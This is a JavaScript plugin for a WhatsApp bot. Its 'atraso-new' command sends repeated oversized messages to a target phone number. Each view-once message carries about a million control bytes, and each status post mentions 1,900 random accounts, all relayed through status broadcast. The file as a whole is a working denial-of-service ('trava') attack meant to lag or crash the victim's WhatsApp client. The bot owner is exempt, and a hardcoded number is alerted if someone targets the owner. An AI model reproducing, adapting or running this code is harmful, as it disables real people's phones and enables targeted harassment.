// plugins/atraso-new.js

module.exports = {
    name: 'atraso-new',
    alias: [],

    async execute(conn, m, args, context) {
        
        // 1. Extraemos las variables y funciones necesarias del 'context'
        const { isBot, isCreator, q, reply, prefix, candList, sleep, generateWAMessageFromContent } = context;

        // 2. Definimos la función de apoyo 'invisível_trava_status' dentro del plugin
        async function invisível_trava_status(target, carousel = null) {
          let sxo = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: { text: "¿𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘?", format: "DEFAULT" },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\x10".repeat(1045000),
                    version: 3
                  },
                  entryPointConversionSource: "galaxy_message",
                }
              }
            }
          }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
          });
          let sXoMessage = {
            extendedTextMessage: {
              text: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
              contextInfo: {
                participant: target,
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
                ]
              }
            }
          };
          const xso = generateWAMessageFromContent(target, sXoMessage, {});
          await conn.relayMessage("status@broadcast", xso.message, {
            messageId: xso.key.id,
            statusJidList: [target],
            additionalNodes: [{
              tag: "meta",
              attrs: {},
              content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
              }]
            }]
          });
          await sleep(500);
          // envia a primeira mensagem (sxo)
          await conn.relayMessage("status@broadcast", sxo.message, {
            messageId: sxo.key.id,
            statusJidList: [target],
            additionalNodes: [{
              tag: "meta",
              attrs: {},
              content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
              }]
            }]
          });
          await sleep(500);
          console.log(`ATRASO INVISÍVEL`);
        }

        // 3. Lógica principal del comando mejorada
        if (!isBot && !isCreator) return;
        if (!q) return reply(`Formato incorrecto.\n*Ejemplo:* ${prefix}atraso-new +5939xxxxxxxx,5`);

        let targetNumber;
        let cantidad = 1; // Default si solo se pone el número
        const limite = 100; // Límite máximo para este comando

        if (q.includes(',')) {
            const parts = q.split(',');
            targetNumber = parts[0].replace(/[^0-9]/g, '');
            const cantidadSolicitada = parseInt(parts[1].trim());

            if (!isNaN(cantidadSolicitada) && cantidadSolicitada > 0) {
                cantidad = Math.min(cantidadSolicitada, limite);
            }
        } else {
            targetNumber = q.replace(/[^0-9]/g, '');
        }

        if (!targetNumber) return reply('El número no es válido.');

        const target = targetNumber + "@s.whatsapp.net";

        if (candList.includes(target)) {
            await reply(`Nel, con el owner no`);
            await conn.sendMessage("593969533280@s.whatsapp.net", {
                text: `User *${m.sender}* intentó usar atraso-new en ${target}.`
            });
            return;
        }

        await reply(`> Iniciando envío a ${targetNumber}\n*Cantidad de sets* : \`${cantidad}\``);

        for (let i = 0; i < cantidad; i++) {
            console.log(`[+] Enviando set de atraso-new #${i + 1} a ${targetNumber}`);
            // El bucle original enviaba 3 mensajes. Mantenemos esa lógica por cada "cantidad".
            await invisível_trava_status(target)
    await sleep(1000)
    await invisível_trava_status(target)
    await sleep(1000)
    await invisível_trava_status(target)
        }

        conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    }
};